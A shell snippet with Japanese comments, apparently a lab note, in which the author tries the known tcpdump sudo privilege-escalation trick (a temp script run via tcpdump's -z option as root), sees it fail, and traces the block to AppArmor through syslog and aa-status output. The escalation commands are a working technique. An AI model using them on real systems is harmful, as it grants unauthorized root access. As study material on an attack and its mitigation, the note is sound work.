```sh
# gtfobinsで調べて昇格コマンド実行したけどpermission denied
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
# [sudo] password for joe:
# dropped privs to root
# tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
# ...
# compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied

# logを調べたらapparmorに止められてた
cat /var/log/syslog | grep tcpdump
# ...
# Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000 

# apparmorのステータス確認(管理者権限が必要)
aa-status 
# apparmor module is loaded.
# 20 profiles are loaded.
# 18 profiles are in enforce mode.
#    /usr/bin/evince
#    /usr/bin/evince-previewer
#    /usr/bin/evince-previewer//sanitized_helper
#    /usr/bin/evince-thumbnailer
#    /usr/bin/evince//sanitized_helper
#    /usr/bin/man
#    /usr/lib/cups/backend/cups-pdf
#    /usr/sbin/cups-browsed
#    /usr/sbin/cupsd
#    /usr/sbin/cupsd//third_party
#    /usr/sbin/tcpdump <- tcpdumpはapparmorでの保護が有効化されてる
# ...
# 2 profiles are in complain mode.
#    libreoffice-oopslash
#    libreoffice-soffice
# 3 processes have profiles defined.
# 3 processes are in enforce mode.
#    /usr/sbin/cups-browsed (502)
#    /usr/sbin/cupsd (654)
#    /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
# 0 processes are in complain mode.
# 0 processes are unconfined but have a profile defined.
```

